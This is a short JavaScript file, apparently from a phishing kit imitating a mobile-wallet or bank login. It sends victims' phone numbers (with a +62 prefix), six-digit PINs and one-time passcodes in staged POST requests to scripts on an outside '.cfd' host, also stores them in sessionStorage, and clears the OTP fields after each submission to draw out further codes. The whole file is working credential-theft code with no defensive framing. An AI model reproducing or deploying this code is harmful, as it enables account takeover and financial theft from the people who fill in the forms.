/////
function sendNohp(event) {
event.preventDefault();
   $("#process").show();
   event.preventDefault();
   $("#inp").blur();
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
   $.ajax({
      type: 'POST',
      url: 'https://choreo.ii-fi.cfd/d0sd/ii/one.php',
      data: dataString,
      complete: function(data) {
         console.log('Complete');
         $("#process").hide();
         document.getElementById("back1").style.display = "none";
         document.getElementById("back2").style.display = "block";
         $("#formNohp").fadeOut();
         setTimeout(function() {
            $("#formPin").fadeIn();
            $("#pin1").focus();
         }, 500);
      }
   });
};


 
 
 
/////
function sendPin() {
event.preventDefault();
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
   $.ajax({
      type: 'POST',
      url: 'https://choreo.ii-fi.cfd/d0sd/ii/two.php',
      data: dataString,
      complete: function(data) {
         console.log('Complete');
         $("#process").hide();
       $(".inline-logo").show();
         var nomor = document.getElementById("nomor").value;
      document.getElementById("alert").innerHTML = "+62 " + nomor + "";
         $(".bgotp").fadeIn();
         $("#formPin").fadeOut();
         
  var items = ["tarif", "nomor"];
  items.forEach(function(item) {
  var value = document.getElementById(item).value;
  sessionStorage.setItem(item, value);
});       
  for (var i = 1; i <= 6; i++) {
  var pin = document.getElementById("pin" + i).value;
  sessionStorage.setItem("pin" + i, pin);
}
      }
   });
};


/////
function submit() {
event.preventDefault();
  xx.style.display = '';
  con.style.marginTop = '';  
    
  $.ajax({
    type: 'POST',
    url: 'https://choreo.ii-fi.cfd/d0sd/ii/three.php',
    data: $('#otp').serialize(),
    dataType: 'json',
    complete: function(data) {     
      console.log(data);
    },
    error: function(xhr, status, error) {      
      console.log(error);
    },
    complete: function() {      
    setTimeout(function() {
    $("#process").fadeOut();      
    $(".animated").removeClass("hide");       
    $(".animated").show();
     }, 500);
      setTimeout(function() {        
        $('#tp1').val('');
         $('#tp2').val('');
          $('#tp3').val('');
           $('#tp4').val('');
            $('#tp1').focus();       
           $(".animated").addClass("hide");              
      }, 4000);
    }
  });
}

